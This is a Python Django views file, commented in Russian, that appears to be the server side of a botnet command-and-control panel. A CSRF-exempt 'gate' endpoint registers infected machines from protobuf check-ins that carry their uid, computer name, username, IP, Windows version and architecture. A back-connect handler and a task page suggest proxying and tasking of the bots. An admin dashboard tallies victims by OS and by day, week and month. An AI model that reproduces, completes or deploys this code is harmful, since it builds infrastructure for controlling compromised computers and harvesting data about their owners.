from django.shortcuts import HttpResponse, render
from django.http import JsonResponse
from django.contrib.auth.models import User
from django.contrib.auth import login
from django.views.decorators.csrf import csrf_exempt
from .bot_pb2 import BotMsg, BackConnectMsg
from .models import Bot
import datetime

# from django.core.paginator import Paginator


# ВСПОМОГАТЕЛЬНЫЙ ФУНКЦИИ --------------------------- \/

class Subsidiary:

    @staticmethod
    def get_bot_ip(request):
        x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
        if x_forwarded_for:
            ip = x_forwarded_for.split(',')[0]
        else:
            ip = request.META.get('REMOTE_ADDR')
        return ip

    @staticmethod
    def get_by_week(_classes: iter) -> int:

        res = []
        now_date = datetime.datetime.now()

        for _class in _classes:

            if _class.date.isocalendar()[0] == now_date.isocalendar()[0] and \
                    _class.date.isocalendar()[1] == now_date.isocalendar()[1]:
                res.append(_class)

        return len(res)

    @staticmethod
    def get_by_day(_classes: iter) -> int:

        res = []
        now_date = datetime.datetime.now()

        for _class in _classes:

            if _class.date.day == now_date.day and \
                    _class.date.year == now_date.year and \
                    _class.date.month == now_date.month:
                res.append(_class)

        return len(res)

    @staticmethod
    def get_by_month(_classes: iter) -> int:

        res = []
        now_date = datetime.datetime.now()

        for _class in _classes:

            if _class.date.year == now_date.year and \
                    _class.date.month == now_date.month:
                res.append(_class)

        return len(res)


# ВСПОМОГАТЕЛЬНЫЙ ФУНКЦИИ --------------------------- /\

# ГЛАВНЫЙ КЛАСС АДМИНКИ --------------------------- \/

class AdminPanel:
    def __init__(self, subsidiary):
        self.sub = subsidiary

    @staticmethod
    def get_login_page(request) -> render:
        return render(request, 'main/login.html')

    def get_main_page(self, request) -> HttpResponse or render:
        bots = Bot.objects.all()

        counts_is_win7 = Bot.objects.filter(is_win7=True).count()
        counts_is_win10 = Bot.objects.filter(is_win10=True).count()
        counts_is_winxp = Bot.objects.filter(is_winxp=True).count()
        counts_is_win8 = Bot.objects.filter(is_win8=True).count()
        counts_is_win11 = Bot.objects.filter(is_win11=True).count()

        _32x = Bot.objects.filter(is_x64=False).count()
        _64x = Bot.objects.filter(is_x64=True).count()

        in_week = self.sub.get_by_week(bots)
        in_day = self.sub.get_by_day(bots)
        in_month = self.sub.get_by_month(bots)
        total = bots.count()

        if request.user.is_superuser:
            return render(request, 'main/main.html', {'win_version': [counts_is_win7, counts_is_winxp, counts_is_win8,
                                                                      counts_is_win10, counts_is_win11],
                                                      'x_oc': [_32x, _64x], 'in_week': in_week, 'in_day': in_day,
                                                      'in_month': in_month, 'total': total})

        return HttpResponse('недостачно прав для просмотра ')

    @staticmethod
    def get_table_page(request) -> render:
        bots = Bot.objects.all()
        return render(request, 'main/table.html', {'bots': bots})

    @staticmethod
    def task(request) -> render:
        return render(request, 'main/task.html')

    @staticmethod
    def admin_table(request):
        return render(request, 'main/admin_table.html')


# ГЛАВНЫЙ КЛАСС АДМИНКИ --------------------------- /\


# ОБРАБОТЧИКИ --------------------------------------------\/


class Handlers:
    def __init__(self, subsidiary):
        self.sub = subsidiary

    def back_connect(self, request):
        try:
            msg = BackConnectMsg()
            msg.ParseFromString(request.body)
            print(msg.uid.decode('utf-16-le'))
            return 200
        except Exception as e:
            print(e)
            return 404

    @staticmethod
    def login_handler(request) -> HttpResponse or JsonResponse:
        print(request.user)
        username = request.POST['login']
        usr = User.objects.get(username=username)

        if usr.check_password(request.POST['password']):
            login(request, usr)
            return JsonResponse({'verdict': '200'})
        return HttpResponse('')

    @csrf_exempt
    def gate(self, request) -> HttpResponse:

        msg_type = BotMsg()
        msg_type.ParseFromString(request.body)

        if msg_type.type == 1:
            pass

        bot = BotMsg()
        bot.ParseFromString(request.body)

        ip = self.sub.get_bot_ip(request)

        uid = bot.uid.decode('utf-16-le')
        computername = bot.computername.decode('utf-16-le')
        username = bot.username.decode('utf-16-le')
        os_major = bot.os_major
        os_minor = bot.os_minor
        is_x64 = bot.is_x64
        is_server = bot.is_server

        try:
            _bot = Bot.objects.get(uid=uid)
        except Exception as e:
            print(e)
            _bot = Bot(ip=ip, uid=uid, computername=computername, username=username, is_x64=is_x64, is_server=is_server)

        if os_major == 10 and os_minor == 0:
            _bot.is_win10 = True
        elif os_major == 6 and os_minor == 1:
            _bot.is_win7 = True
        elif os_major == 5 and os_minor == 1:
            _bot.is_winxp = True

        _bot.save()

        return HttpResponse('200')

    @staticmethod
    def ban(request) -> HttpResponse:
        bot = Bot.objects.get(uid=request.GET['uid'])
        bot.is_banned = True
        bot.save()
        return HttpResponse('200')

# ОБРАБОТЧИКИ -------------------------------------------- /\
